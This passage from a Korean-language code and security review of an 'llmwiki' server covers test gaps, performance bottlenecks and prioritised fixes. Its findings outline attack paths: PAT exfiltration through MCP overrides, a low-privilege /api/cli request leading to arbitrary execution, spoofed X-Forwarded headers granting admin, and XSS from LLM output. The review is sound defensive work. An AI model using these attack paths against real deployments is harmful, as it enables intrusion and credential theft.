그것은 유효하고, **여기서는 그 다음을 적는다** — 어떤 테스트를 쓰면 실제로 결함을 잡는가.

| 모듈 | 지금 없는 것 | 있었다면 잡았을 것 |
|---|---|---|
| `query_engine._retrieve` | `stop_after` 세 경로가 **같은 키 집합**의 R 을 돌려주는지 | §3.3 의 `inject` 키 누락 |
| `query_engine._replay_retrieval` | 재생 경로가 정상 경로와 **같은 단계 집합**을 통과하는지 | §2.4(a) doc_acl 누락 |
| `store` | 인덱스가 실제로 쓰이는지 (`EXPLAIN QUERY PLAN` 단언) | §5.3 의 `proposals` 전수 스캔 |
| `atomicio` | 경로가 매번 다를 때 `_locks` 가 자라는지 | §2.9 |
| `reqmgr` | GET 경로가 속도 제한을 받는지 | §2.7 |
| `mcp._query_with` | 도구 인자의 `overrides` 가 걸러지는지 | **§2.1 (PAT 유출)** |
| `auth.classify_cli` | `cli.py` 의 모든 서브커맨드가 표에 **명시적으로** 있는지 | **§2.2 (class2 → 임의 실행)** |

#### 수치로 본 표면 커버리지

| 표면 | 전체 | 단위 테스트에서 직접 불리는 것 | 어느 계층에서도 안 보이는 것 |
|---|---:|---:|---|
| `server.py` 의 고유 `/api/*` 경로 | 107 | 66 | **3개** — `/api/evolve/auto_apply` · `/api/models/automap` · `/api/query_rules/effect` (`verify_web`·`verify_settings_sync`·`verify_security_ui`·`verify_monkey` 에도 없음) |
| `cli.py` 의 `add_parser(...)` 서브커맨드 | 46 | 24 | 나머지 22개는 `verify_cli.py`(수동) 에서만 → **그 하네스를 안 돌리면 CLI 절반이 미검증** |
| `mcp.py` 의 도구 | 19 | 19 | 0 — **여기는 구멍이 없다** |

`tests/test_web_api.py` 가 **5개**뿐이라는 것도 짚어야 한다 — 2,162줄짜리 `server.py` 에 대해.
`verify_web.py`(377요청)가 덮고 있지만 그것은 **수동 하네스**다(§4.4).

#### 전 계층 미검증 모듈 2개

| 모듈 | 크기 | 상태 |
|---|---|---|
| `llmwiki/ruleeffect.py` | 10KB | CLI `rules effect`(`cli.py:1186`)·`/api/query_rules/effect` 로만 접근. `verify_cli.py` 에 `rules effect` 없고 `verify_web.py` 에 그 경로 없음 → **완전 미검증**. `DEEP_REVIEW_0919 §1.2` 가 이번 회차의 품질 손잡이로 내세운 기능이다 |
| `llmwiki/configdoc.py` | 22KB | CLI `config doc`(`cli.py:1916`) 전용. `verify_cli.py` 에 `config doc` 없음 → **완전 미검증** |

#### 실행 경로가 한 번도 돌지 않는 기능

- **`providers.EnsembleLLM`** (역할 단위 다중 LLM). `tests`·`tools` 전체에서 `ensemble` 히트는
  `test_ensemble_surface.py`(설정 왕복 + 소스 grep) · `verify_cli.py:607-632`(config 왕복) ·
  `verify_surface_align.py`(존재 확인) 뿐이다. **N개 모델 병렬 호출 · `wait=first|all` · `timeout_s` ·
  `min_results` · 가중 집계 · aggregator LLM 병합 · 일부 멤버 실패** — 어느 것도 한 번도 실행되지 않는다.
  `ENSEMBLE.md` 가 문서화한 기능 전체가 코드로만 존재한다. QA_HARDENING 은 이것을 언급조차 하지 않는다.
- **`graph_llm.py`** — 거의 모든 테스트가 `Toggles(llm_graph=False)` 로 끈다
  (`test_doc_acl.py:185`, `test_rag_edge_cases.py:66`, `test_resource_limits.py:187`, `test_review_0917.py:488` …).
  §2.13 A 의 XSS 경로가 여기서 나온다.

### 4.2a 다중 프로세스가 전혀 시험되지 않는다 — `buildlock.py` 의 존재 이유가 미검증

`tests/` 전체에서 `multiprocessing` 사용은 **0건**이다. 진짜 자식 프로세스를 띄우는 4파일
(`test_console_0915.py:25`, `test_mcp_stdio_client.py`, `test_rag_federation.py:110`, `test_headless_switch.py`)은
모두 **외부 도구를 흉내 내는 용도**이지, 같은 `data_dir`·`config.json` 을 두 프로세스가 동시에 만지는 시나리오가 아니다.

그 결과 `llmwiki/buildlock.py` 의 **존재 이유 자체**가 검증되지 않는다.
`tests/test_phase0.py:145-158` 은 **같은 프로세스**가 `with BuildLock(path)` 안에서 다시 잡는 것만 본다.
따라서 다음이 한 번도 실행되지 않는다:

- `buildlock.py:62-67 _is_stale()` — 죽은 락 회수
- `buildlock.py:23-44 _pid_alive()` — Windows `OpenProcess`/`GetExitCodeProcess` 분기 포함
- `buildlock.py:82 os.open(O_CREAT|O_EXCL)` 의 진짜 레이스
- `buildlock.py:98-105` 대기 중 `progress.note()` 알림

"서버 워처 · CLI 빌드 · OS 스케줄러(`setup/schedule_build.ps1`)가 동시에 빌드한다" 는 것이
`CONCURRENCY.md §8` 의 전제인데, 그 전제가 시험된 적이 없다.

같은 이유로 `atomicio` 도 **스레드만** 본다 (`test_concurrency_0915.py:1268-1304`, 같은 프로세스 12스레드).
그런데 `atomicio.py:5-14` 의 docstring 이 적은 원래 증상(`os.replace` 의 `WinError 5`)은
**서로 다른 프로세스**가 같은 파일을 만질 때 나던 것이다 — 그 조합은 재현하지 않는다.

### 4.3 "부하가 끝난 뒤 제자리로 돌아오는가" 의 측정 대상이 좁다

`tests/test_resource_limits.py`(9항목)는 `Store.pool_info().live` · 스레드 수 · 진행 표시만 본다.
같은 질문을 던질 수 있는 **다른 전역 상태**가 확인되지 않는다:

| 전역 | 파일:줄 | 자라는 조건 |
|---|---|---|
| `atomicio._locks` | `atomicio.py:45` | 질의마다 (§2.9) |
| `RequestManager._rate` | `reqmgr.py:400` | 사용자·IP 마다 |
| `RequestManager.clients` | `reqmgr.py:399` | 〃 (+`origins` 하위 딕셔너리) |
| `Pipeline._llms` / `._embedders` | `pipeline.py:125-126` | 상한 있음(64/8) — **검증됨이 아니라 코드에 있음**. 테스트는 없다 |
| `progress._LIVE` | `progress.py` | `_KEEP_DONE_S`=300 로 정리 — 정리가 실제로 도는지 확인 필요 |
| `_JOBS` | `web/server.py:2103-2107` | 최근 50건 유지 |
| `retrieval._CE_CACHE` | `retrieval.py:555` | 모델 수 (상한 없음, 실질 1~2) |

soak 을 "숫자 하나(live=0)" 가 아니라 **"이 표의 모든 값이 기준선으로 돌아온다"** 로 바꾸면
§2.9 같은 결함이 자동으로 잡힌다.

### 4.4 하네스가 CI 게이트가 아니고, 결과가 낡았고, 없는 브라우저가 "통과" 로 집계된다

**(a) 자동화된 것은 단위 테스트뿐이다.** 저장소에 `.github/`·`.gitlab-ci.yml`·`Makefile`·`tox.ini`·`conftest.py` 가 없다.
`run.bat:12-15` 의 `test` 는 `python -m unittest discover -s tests -v` 만 돌리고 `tools/verify/*` 를 부르지 않는다.
`tests/` 안에서 하네스를 실행·import 하는 코드도 없다. 즉 **21~25종 하네스는 사람이 `python tools\verify\verify_all.py`
를 직접 쳐야 한다**(실측 약 48분, 그중 `monkey` 혼자 27분).

**(b) 마지막 하네스 결과가 낡았다 — 그리고 그것이 문서 검증의 기준이다.**
`tools/verify/verify_all_result.json` 은 `when=2026-09-19 12:26`, `unit 343/343` 이다.
현재 단위 테스트는 **428개**다. 즉 QA 하드닝으로 늘어난 ~85개가 들어간 뒤
**하네스 전체가 한 번도 재실행되지 않았다.**
`verify_docs.py` 가 이 JSON 을 문서 숫자 대조의 원천으로 쓰므로,
**문서 정합 검증 자체가 낡은 값을 보고 있다** (§2.16 의 343 vs 428 이 여기서 나온다).

**(c) 브라우저가 없으면 `exit 0` 이고, `verify_all` 은 그것을 OK 로 센다.**
CDP(Edge/Chrome)를 요구하는 하네스 9종
(`verify_browser` `verify_buttons` `verify_responsive` `verify_security_ui` `verify_rerun_ui`
`verify_act_detail_load` `verify_schedule_ui` `verify_collab_many` `verify_click`)은
브라우저를 못 찾으면 **정상 종료(exit 0)** 한다
(`verify_browser.py:21-23`, `verify_buttons.py:263/315`, `verify_security_ui.py:177/374`,
`verify_rerun_ui.py:74/108`, `verify_responsive.py:139`, `verify_schedule_ui.py:52/86`,
`verify_act_detail_load.py:57/90`, `verify_click.py:193/225`).
`verify_all` 은 exit 0 을 **통과**로 집계한다 → 브라우저 없는 환경에서 **"전부 OK" 가 뜨지만 아무것도 보지 않았다.**
`verify_live_models` 도 붙는 모델이 없으면 같은 식으로 SKIP-as-OK 다(`verify_live_models.py:182`).

**(d) 게이트로 쓸 수 있는 부분집합은 실제로 존재한다.** 위 9종과 `verify_live_models` 를 빼면
나머지(`unit`·`stress`·`docs`·`align`·`stage_align`·`settings_sync`·`cli`·`web`·`mcp`·`wiring`·`timeout`·`soak`·`monkey`)는
**외부 네트워크 없이** 돈다 — 전부 `127.0.0.1` 에 자식 프로세스 서버를 띄우고 임시 `data_dir` 로 격리한다
(`verify_cli.py:9-12`, `verify_web.py:8-12`). 필요한 것은 포트
8792 / 8901~8910 / 8934 / 8971~8972 / 9401~9410 이 비어 있는 것뿐이다.
예외 하나: `verify_browser.py` 는 **실제 프로젝트 루트 DB** 로 서버를 띄운다(docstring 명시).

**(e) 하네스가 저장소 문서를 고친다.** `verify_all.py:167-182` 가
`docs/history/2026-09-19/VERIFICATION_0918.md` 의 `<!-- VERIFY_ALL_TABLE -->` 구간을 **직접 덮어쓴다**.
검증 스크립트가 검증 대상 저장소를 수정하는 구조다 — CI 에 넣으려면 먼저 분리해야 한다.

**(f) `SUITES` 에 없는 파일 2개**: `verify_click.py` · `bench_fts.py` 는 `verify_all` 로는 절대 실행되지 않는다(수동 전용).
`verify_click.py` 가 `verify_buttons.py` 로 대체된 것인지는 **확인 필요**.

### 4.5 LLM 이 만든 값이 신뢰 경계를 넘는지 보는 테스트가 없다

`tests/test_prompt_injection.py`(15항목)는 **문서 본문 → 프롬프트** 방향을 본다.
반대 방향, 즉 **LLM 출력 → 우리 시스템** 은 테스트가 없다:

- 라우터 LLM 의 `doc_types` → `plan` → 화면 innerHTML (§2.13 B)
- `graph_llm` 의 `entity.type`/`source` → DB → 화면 innerHTML (§2.13 A)
- `check_claims_llm` 의 `verdict` → `groundedness` 계산 (범위 검증은 있음, `answer.py:488`)
- `_fusion_llm` 의 `drop` 인덱스 → 후보 제거 (범위 검증 있음, `query_engine.py:790`)

뒤 둘은 방어돼 있고 앞 둘은 아니다. "LLM 출력은 사용자 입력과 같은 등급의 데이터" 라는 규칙을
`ctxguard.py` 만 지키고 나머지는 모른다.

### 4.6 skip 은 거의 없는데, `tearDown` 이 정리 실패를 삼킨다

**skip 은 딱 2건으로 건전하다.** `@unittest.expectedFailure` 나 파일 단위 skip 은 없다.

| 위치 | 종류 | 영향 |
|---|---|---|
| `tests/test_headless_switch.py:108` | `@skipUnless(os.name == "nt", …)` | WinError 206 회귀가 **비Windows 환경에서는 전혀 검증되지 않는다**. 이 프로젝트의 배포 대상이 Windows 이므로 실질 문제는 작다 |
| `tests/test_review_0917.py:267-268` | `self.skipTest("presets.json 없음")` | 저장소 루트의 `presets.json` 존재에 의존 — 파일이 지워지면 **조용히** 스킵 |

**문제는 `tearDown` 쪽이다.** 자원 정리 실패를 삼키는 자리가 있고, 그것이 하필
`test_resource_limits.py` 가 잡으려는 바로 그 부류다.

| 위치 | 무엇을 삼키나 |
|---|---|
| `tests/test_concurrency_0915.py:77-78` (`tearDown`) | `store.close()` 실패 — **연결 누수/닫기 실패가 숨는다** |
| `tests/test_features_0914.py:498-499` (`tearDown`) | `httpd.shutdown()`·핸들러 복원 실패 — 클래스 간 전역 오염 가능 |
| `tests/test_rag_federation.py:118-119`, `:259-260` | 자식 프로세스 `terminate()` 실패 — **좀비가 남아도 테스트는 통과** |
| `tests/test_review_0917.py:498-507` | `rows` 가 비어 있으면 `bad=[]` → **공허하게 통과**. `assertTrue(rows)` 가 없다 |

나머지(`test_features_0914.py:340-341`, `test_log_quota.py:52-53`, HTTPError 본문 파싱 폴백들)는
주석으로 정당화된 의도적 처리다.

---

## §5. 성능 — 문서 1만 건 / 동시 사용자 30명에서 먼저 무너질 곳

기준: 1만 문서 ≈ 20만 청크 ≈ 엔티티 수만~십수만 ≈ mentions·relations 수백만 행.
(`DEEP_REVIEW_0919 §2` 의 실측은 352문서·16,892청크 기준이므로 **약 12배 큰 규모**를 추정한다.)

### 5.1 1순위 — `/api/status` 와 `/api/activity` 의 무제한 폴링 (§2.7 의 성능 면)

이것이 가장 먼저 무너지는 이유는 **부하가 질의 수가 아니라 접속자 수에 비례**하기 때문이다.

```
브라우저 탭 1개 = /api/activity 0.5 req/s (core.js:1215) + /api/status 간헐
30명 × 탭 1개 = 15 req/s, 속도 제한 없음, 읽기 슬롯 밖
  · /api/activity → RequestManager._lock 획득 → active 전체 + history 25 순회
                  → 항목마다 progress._LOCK 획득 (reqmgr.py:739 _pg.get)
                  → LiveRegistry.list_external() → os.listdir + 파일 읽기 (reqmgr.py:358-383)
  · /api/status   → store.stats() = COUNT(*) 11회 (store.py:353-369)
                    relations·mentions 가 수백만 행 → 각 수백 ms
```

`RequestManager._lock` 은 **티켓 발급 경로와 같은 락**이다(`reqmgr.py:394-395`, 사용처 `:534`).
즉 대시보드 폴링이 질의 수락을 직접 느리게 만든다. 질의가 1건도 안 들어와도 그렇다.

**근거의 한계**: 1만 문서 환경에서 실제로 측정하지 않았다. 다만 (a) COUNT(*) 가 전수 스캔이고
(b) 폴링이 제한 없고 (c) 락이 공유된다는 세 가지는 코드로 확정된 사실이다.

### 5.2 2순위 — `_match_entities` 의 파이썬 전수 루프 (질의마다 2회 이상)

```
llmwiki/retrieval.py:74-88
    def _match_entities(store, query, k=8):
        hits = store.entity_fts(match, k)          # 인덱스 — 빠르다
        ql = query.lower()
        for e in store.entity_index():              # ← 엔티티 전체
            for n in e["names"]:                    # ← 이름 + 별칭 전부
                if n in ql:                         # ← 파이썬 부분 문자열
```

`entity_index()`(`store.py:968-984`)는 `build_version` 별로 캐시되므로 SQL 은 한 번이다.
문제는 **파이썬 루프**다. 이 함수는 질의마다 최소 두 번 불린다 —
`route()`(`retrieval.py:54`)에서 한 번, `graph_search()`(`retrieval.py:227`)에서 시드가 없으면 또 한 번.
fallback 라운드(`graph`·`wide`)가 돌면 그만큼 더 곱해진다.

10만 엔티티 × 평균 2 이름 = **20만 회 부분 문자열 검사 / 호출**. 순수 파이썬이라 GIL 을 잡는다.
동시 8건이 돌면 이 구간은 **직렬화**된다.

**근거의 한계**: 실제 엔티티 수를 재지 않았다. 352문서에서 617개(`DEEP_REVIEW_0919:100` 인용)였으므로
1만 문서면 1.7만 개 선형 추정이 자연스럽다 — 그러면 3.4만 회/호출이라 수 ms 수준으로, 생각보다 견딜 만하다.
**다만 `co_occurs` 와 ID 노드가 늘면 비선형으로 커진다.** 켜기 전에 `entity_index()` 크기를 재는 것이 맞다.

### 5.3 3순위 — 질의마다 도는 `add_proposal` 의 인덱스 없는 중복 검사

`evolve_capture` 토글은 **기본 켜짐**(`config.py:207`)이고, `capture_query`(`evolve.py:65-97`)가
질의마다 최대 6건의 `store.add_proposal` 을 부른다. 그 안에서:

```
llmwiki/store.py:1330-1333
    r = self.conn.execute("SELECT id FROM proposals WHERE kind=? AND payload=? "
                          "AND status IN ('proposed','applied')", (kind, pj)).fetchone()
```

`proposals` 테이블에는 **인덱스가 하나도 없다** (`store.py:65-68` 의 CREATE TABLE, `CREATE INDEX` 목록 `:29-100` 에 없음).
`payload` 는 JSON 문자열 전체와 비교하므로, 행 수 × 문자열 비교의 전수 스캔이다.
archived 행도 status 필터를 **인덱스 없이** 적용하므로 함께 스캔된다.

30명 × 20질의/일 × 최대 6회 = 3,600회 전수 스캔/일. 제안이 수만 건 쌓이면 질의 경로에 직접 지연이 붙는다.

조치: `CREATE INDEX idx_proposals_dedup ON proposals(kind, status, payload)` 한 줄.
(`payload` 를 sha1 로 줄여 `payload_sha` 컬럼에 인덱스를 거는 편이 더 낫다.)

### 5.4 4순위 — 질의마다 ~150KB 의 쓰기 I/O

한 질의가 끝날 때 일어나는 쓰기:

| 무엇 | 크기 | 파일:줄 |
|---|---|---|
| `requests` 행 (result + trace + config JSON) | ≈ 67KB (`DEEP_REVIEW_0919:922` 인용) | `store.py:1125-1133` |
| `data/requests/YYYY-MM/req_<id>.json` (같은 내용 다시) | ≈ 67KB | `store.py:1136-1142`, `:1151-1158` |
| `data/reruns/req_<id>.json` (`rerun_capture` 기본 on) | 수십 KB | `rerun.py:180-202` |
| `query_log` 행 | 수 KB | `query_engine.py:541` |
| `episodes` 행 | 작음 | `query_engine.py:581` |

`result["config"]` 에는 **튜닝 145개 값 전체와 토글 56개**가 들어간다(`query_engine.py:511-513`).
즉 모든 질의가 같은 설정 스냅샷을 통째로 복제해 저장한다.

600질의/일 × 150KB ≈ **90MB/일**. `keep_requests`(2000)가 DB 행을, `requests_keep_days`(90)가 파일을,
`rerun_keep`(50)이 재실행 파일을 정리하므로 무한히 자라지는 않는다. 다만:

- SQLite 쓰기는 **프로세스 전체에서 직렬화**된다(WAL 이라도 writer 는 하나). 67KB 쓰기 × 초당 몇 건 +
  빌드의 쓰기가 겹치면 `db_busy_timeout_s`(60초) 경쟁이 시작된다.
- 정리(`DELETE FROM requests WHERE id <= rid - keep`)가 **50건마다 한 번**(`store.py:1145`) 큰 삭제로 몰려서,
  그 질의 하나만 눈에 띄게 느려진다.

조치: `config` 를 요청마다 복제하지 말고 **해시로 참조**한다(같은 설정이면 한 번만 저장).

### 5.5 이미 잘 되어 있는 것 (먼저 무너지지 않는 곳)

- **벡터 검색**: `matmul_sims`(`retrieval.py:182-190`)가 float16 행렬을 블록 단위로 변환해 BLAS 를 쓴다.
  20만 × 1024d float16 = **410MB RAM**, 내적 수십 ms. `np.argsort(-sims)`(`:211`)가 전체 정렬이라
  `np.argpartition` 으로 바꿀 여지는 있지만 20만에서는 수십 ms 로 병목이 아니다.
- **그래프 질의**: `mentions` 의 PK `(entity_id, chunk_id)`(`store.py:52`)가 암시적 인덱스를 만들어
  `chunks_for_entities`(`store.py:1051-1058`)의 `WHERE entity_id IN (…)` 이 인덱스를 탄다.
  `relations` 의 `src`/`dst` 도 인덱스가 있다(`store.py:45-46`). **여기는 문제없다.**
- **증분 빌드**: stat 스캔 + 해시 비교 + 임베딩 캐시. 설계가 맞다.
- **컨텍스트 예산**: `models_catalog.context_budget`(QA 2-A)이 모델 창을 본다.

### 5.6 30명 규모에서 실제로 먼저 아플 것 — 요약

| 순위 | 무엇 | 비례 대상 |
|---|---|---|
| 1 | `/api/status`·`/api/activity` 폴링 + `RequestManager._lock` 경쟁 | **접속자 수** (질의 수 아님) |
| 2 | 질의당 150KB 쓰기와 SQLite writer 직렬화 | 질의 수 |
| 3 | `proposals` 전수 스캔 | 질의 수 × 누적 제안 수 |
| 4 | `_match_entities` 파이썬 루프 | 질의 수 × 엔티티 수 |
| 5 | 연결당 스레드 (§2.11) | 접속자 수 × 브라우저 연결 6 |

**1번이 1위인 이유가 중요하다**: `CONCURRENCY.md` 의 모든 손잡이(`max_parallel_reads`·`queue_max`·
`rate_limit`)는 **질의 경로**를 조절하는데, 먼저 아픈 것은 **조절되지 않는 대시보드 경로**다.

---

## §6. 개선 제안

각 항목: 우선순위 / 예상 작업량 / **하지 않았을 때의 대가**.

### P0 — 릴리스 전 (앞의 셋은 착취 가능, 넷째는 재발 방지)

| # | 할 일 | 작업량 | 하지 않으면 |
|---|---|---|---|
| **P0-0** | **MCP 경로에 `_filter_overrides` 를 적용한다** (`mcp.py:502-517`·`:846-849`·`:866-868`). 근본적으로는 필터를 `Pipeline.request_scope` 안으로 옮겨 `actor` 와 한 자리에서 판정한다 | 2~3시간 | **`.env` 의 게이트웨이 PAT 가 공격자 URL 로 나간다** (§2.1). `/mcp` 는 read 등급이라 `anonymous_role` 설정 시 **로그인 없이** 성립한다. Web 문만 막고 MCP 문을 열어 둔, 이미 한 번 고친 결함의 재발 |
| **P0-0b** | `classify_cli` 의 fallback 을 `edit` → `admin` 으로 올리고 `schedule`·`server`·`optimize`·`inspect`·`rerun` 을 표에 명시한다 | 1~2시간 | **class2 가 `POST /api/cli {"argv":"schedule add …"}` 로 `python`/`cli` 액션을 등록해 서버 프로세스 권한으로 임의 실행**한다 (§2.2). `POST /api/schedule` 의 admin 게이트가 무의미해진다 |
| P0-1 | `Pipeline.actor` 기본값을 `admin` → `viewer` 로 뒤집고, CLI 단독 실행(`cli.py` 의 `Pipeline(s)` 경로)에서만 admin 을 명시한다. 그 뒤 `/api/cli`·`/api/query/rerun`·`/api/sweep`·`/api/eval`·`_start_job` 에 실제 actor 를 넘긴다 | 반나절 + 회귀 확인 | **viewer 가 `POST /api/cli {"argv":"query …"}` 한 번으로 등급 문서를 읽는다** (§2.3). `SECURITY.md`·`QA_HARDENING_0919` 가 막았다고 선언한 것이 막히지 않는다 — 운영자가 안전하다고 믿는 상태에서 인사·보안 문서를 색인하게 된다 |
| P0-2 | `_replay_retrieval` 에 `doc_acl` 을 넣고, `/api/rerun`·`/api/query/rerun`·`/api/jobs/<id>`·`/api/progress`·**`/api/query_trace`** 에 소유자 검사를 붙인다 | 반나절 | 남의 질문·근거·답변이 request_id 열거만으로 읽힌다 (§2.4, §2.6, §2.10). 사내 위키에서 "누가 무엇을 물었나" 는 그 자체로 민감 정보다 |
| P0-3 | `_cache_key`·`answer_signature` 에 유효 접근 등급을 넣는다. 그 전까지는 `query_cache`/`precompute` 를 켤 때 경고를 띄우고 `SECURITY.md` 에 명시한다 | 2~3시간(등급 산출) | 토큰을 아끼려고 캐시를 켜는 순간 접근 제어가 사라진다 (§2.5). **가장 나쁜 형태의 결함** — 성능 최적화가 보안을 끈다 |
| P0-4 | `tests/test_entrypoint_contract.py` 추가 (§4.1) + `test_doc_acl` 을 **HTTP 왕복**으로 고쳐 `_actor_of`·`_actor_from_client` 가 실제로 실행되게 한다 (§4.0) | 반나절 | P0-0~3 을 고쳐도 **다음에 또 같은 모양으로 깨진다**. 이 저장소가 이미 네 번 겪은 패턴이다(CODE_REVIEW 0917 P0-1, QA 1-B, 4-A, 4-D) |
| P0-5 | `GET /api/logs` 의 `file` 인자를 `os.path.basename` + 허용 목록으로 제한한다 | 30분 | 익명 viewer 가 디스크의 임의 `.log` 파일을 읽는다 (§2.6) |
| P0-6 | `verify_all.py` 를 재실행해 `verify_all_result.json` 을 갱신하고, 브라우저 부재의 `exit 0` 을 **OK 가 아닌 SKIP** 으로 집계하게 고친다 | 1~2시간(+실행 48분) | 지금의 "전부 통과" 는 **343개 기준의 낡은 값**이고, 브라우저 없는 환경에서는 UI 하네스 9종이 아무것도 보지 않고 통과로 집계된다 (§4.4) |

### P1 — 30명 운영에서 실제로 아픈 것

| # | 할 일 | 작업량 | 하지 않으면 |
|---|---|---|---|
| P1-1 | GET 경로에 속도 제한을 적용한다(슬롯은 주지 않고 `_rate_check` 만). `store.stats()` 를 `build_version` 별로 캐시한다 | 2~3시간 | 접속자가 늘수록 서버가 느려진다. 원인이 질의가 아니라 대시보드라서 `server status` 를 봐도 안 보인다 — **운영자가 디버깅할 수 없는 종류의 느림** |
| P1-2 | `CREATE INDEX idx_proposals_dedup ON proposals(kind, status, payload)` (또는 `payload_sha` 컬럼) | 30분 + 마이그레이션 | 제안이 쌓일수록 **모든 질의가** 느려진다. 자가진화가 성공할수록 시스템이 느려지는 역설 |
| P1-3 | `atomicio._locks` 에 상한을 두거나 `archive_request` 를 락 밖으로 뺀다 | 1시간 | 며칠~몇 주 단위로 메모리가 늘고, `CONCURRENCY.md §9` 의 진단표가 **틀린 원인**(SQLite 세션)을 가리킨다 |
| P1-4 | soak 테스트의 판정을 §4.3 의 전역 상태 표 전체로 넓힌다 | 반나절 | P1-3 같은 누수가 또 생겨도 못 잡는다 |
| P1-5 | 동시 연결 수 상한 (`ThreadingHTTPServer` 를 감싼다) | 2~3시간 | 연결 폭주에 스레드로 응답한다. 논리적 대기열(64)이 있어도 **그 앞단이 무방비**다 |
| P1-6 | `result["config"]` 를 해시 참조로 바꾼다 | 반나절 | 질의당 쓰기 I/O 가 줄지 않아, 빌드와 겹칠 때 `database is locked` 가 는다 |
| P1-7 | `security.json` 저장 시 `os.chmod(0o600)` — `auth.py:198` 이 `.session_secret` 에 이미 쓰는 패턴을 그대로 | 30분 | POSIX 기본 umask 면 0644 로 저장돼 **서버 계정 외 로컬 사용자가 PBKDF2 해시와 API 키 해시를 읽는다**. `SECURITY.md` 는 파일 권한을 한 번도 언급하지 않는다 |
| P1-8 | 헤더 SSO 의 `trusted_proxies` 기본값(`auth.py:88`)을 **빈 목록**으로 바꾸고, "프록시가 인입 `X-Forwarded-User/Groups` 를 제거해야 한다" 를 `SECURITY.md §4.3` 에 필수 전제로 적는다 | 1시간 | 기본값이 `["127.0.0.1","::1"]` 이라, `sso.enabled:true, type:"header"` 만 켜고 `trusted_proxies` 를 안 고치면 **서버 PC 의 아무 로컬 프로세스가 `X-Forwarded-User` 로 admin 이 된다**. 프록시가 헤더를 strip 하지 않으면 사용자가 `X-Forwarded-Groups: wiki-admins` 를 직접 붙일 수 있다 |
| P1-9 | 감사 로그의 `backups <= 0` 경로에서 **truncate 하지 않는다** (`auth.py:1079`) | 1시간 | 설정 한 줄로 감사 기록 전체가 지워지고, 그 지운 행위의 기록도 함께 사라진다 (§2.12) |
| P1-10 | `/api/forensic/llm`·`/api/analysis/insight` 의 등급을 `read` → `run` 으로 (`auth.py:342`) | 30분 | 익명 viewer 가 LLM 토큰을 태운다. `SECURITY.md §2.2` 의 `run` 정의와 정면으로 어긋난다 |

### P2 — 구조·품질 (다음 회차)

| # | 할 일 | 작업량 | 하지 않으면 |
|---|---|---|---|
| P2-1 | `QueryEngine.run` 의 여섯 축을 분리한다. 최소한 `_retrieve` 의 세 벌 반환 딕셔너리를 한 생성자로 모은다 (§3.3) | 1~2일 | `stop_after`·`resume`·`capture` 조합마다 다른 버그가 계속 나온다. §2.4(a) 와 `inject` 키 누락이 그 첫 두 개다 |
| P2-2 | `graph_txt`·`mcp_enrich` 에 `ctxguard` 와 `acl` 적용 (§2.8) | 2~3시간 | 인젝션 방어에 **문서화된 구멍**이 남는다. `ctxguard.py` 가 스스로 방어 대상이라고 적은 MCP 경로가 방어되지 않는다 |
| P2-3 | LLM 출력 값(`doc_types`·`entity.type`)을 서버에서 화이트리스트로 좁히고, 프런트 두 자리에 `esc()` (§2.13) | 1~2시간 | `llm_graph`/`router_llm` 을 켜는 순간 저장형 XSS 가 열린다. 둘 다 품질을 위해 켜라고 권하는 토글이다 |
| P2-4 | `_query_legacy`(157줄) 삭제, `extAuto`·`clearTuningOverrides`·`loadExternalWork` 삭제. `CODE_REVIEW_0917.md:76` 의 `rrf_fuse` 항목을 정정 (§2.15) | 1시간 | 읽는 사람이 매번 "어느 쪽이 진짜인가" 를 판단한다. 더 나쁘게는, 낡은 리뷰를 믿고 **살아 있는 `rrf_fuse` 를 지운다** |
| P2-5 | 프런트 렌더링 헬퍼 3종(table/stat/pill)과 입력 위젯 1종을 `core.js` 로 올린다 (§3.3) | 1일 | JS 451KB 가 계속 큰다(`DEEP_REVIEW_0919 §3.4`). `/static/` ETag 와 함께 하면 효과가 배가 |
| P2-6 | `knowledge.js:97` rAF 취소, `collab.js:250` 에 `document.hidden` 검사 | 1시간 | 사용자 노트북 팬이 돈다. 사소해 보이지만 "이 시스템은 무겁다" 는 인상을 만든다 |
| P2-7 | 문서 수치 동기화: `DEEP_REVIEW_0919:232` 의 343 → 428, `CODE_REVIEW_0917.md:76` 정정 (§2.16) | 30분 | 같은 날 문서가 서로 다른 숫자를 말하면 **모든 수치의 신뢰도**가 떨어진다 |

---

## §7. 하지 말아야 할 것 — 좋아 보이지만 여기서는 틀린 개선안

이 절이 이 리뷰에서 가장 중요할 수 있다. 위 제안들을 "제대로" 하려는 다음 사람이
이 프로젝트의 제약을 모르고 손댈 수 있기 때문이다.

### 7.1 ❌ FastAPI / Starlette / uvicorn 으로 옮기기

`_do_get` 533줄, `_dispatch_post` 520줄을 보면 "라우팅 프레임워크를 쓰면 데코레이터로 깔끔해진다" 는 생각이 자연스럽다.
**틀렸다.**

- 외부 의존성이 곧 **포팅 비용**이다. 이 시스템의 전제는 "폴더를 복사해 사내망 PC 에서 `python -m llmwiki serve`"
  (`setup/INSTALL.md`, 메모리의 포팅 요구사항). 사내망에서 pip 가 막혀 있으면 uvicorn 하나 때문에 전체가 멈춘다.
- FastAPI 는 async 를 전제한다. 이 코드베이스는 **동기 + 스레드**로 일관되어 있고(`reqmgr.RWLock`,
  `Store.session()` 의 스레드 로컬, `threading.local` 기반 `Pipeline.s`), async 로 옮기면
  **요청 격리 설계 전체를 다시 써야 한다**. 얻는 것은 라우팅 문법뿐이다.
- 진짜 문제(§2.3)는 라우팅이 아니라 **계약 검증의 부재**다. 데코레이터로 바꿔도 `actor` 를 빠뜨릴 수 있다.
  P0-4 의 계약 테스트가 프레임워크 교체보다 싸고 확실하다.

**대신 할 것**: 디스패처는 그대로 두고, `_dispatch_post` 진입부에서 `actor`·티켓·소유자 검사를
**한 번에 적용하는 공통 래퍼**를 만든다. 분기마다 반복하지 않아도 되게.

### 7.2 ❌ 진짜 벡터 DB(FAISS / Chroma / pgvector) 도입

20만 청크에서 numpy 전수 내적은 수십 ms 다(§5.5). **벡터 검색은 병목이 아니다.**
`DEEP_REVIEW_0919 §2.2` 가 측정한 대로 실 LLM 질의는 **25.8초 중 25.3초가 LLM** 이다.
ANN 인덱스를 넣으면 (a) 의존성이 늘고 (b) 증분 빌드에서 인덱스 재구축 문제가 생기고 (c) recall 이 떨어지는데
(d) 아끼는 시간은 전체의 0.1% 미만이다.

**대신 할 것**: 100만 청크를 넘을 때 다시 본다. 그전에는 `np.argpartition`(`retrieval.py:211`) 정도면 충분하다.

### 7.3 ❌ SSE / WebSocket 으로 스트리밍 전환

"폴링 대신 SSE 를 쓰면 `/api/activity` 부하가 사라진다" — 표면적으로 맞지만 여기서는 틀린 계산이다.

- SSE 는 **연결을 계속 붙잡는다**. `ThreadingHTTPServer` 는 연결당 스레드이므로(§2.11),
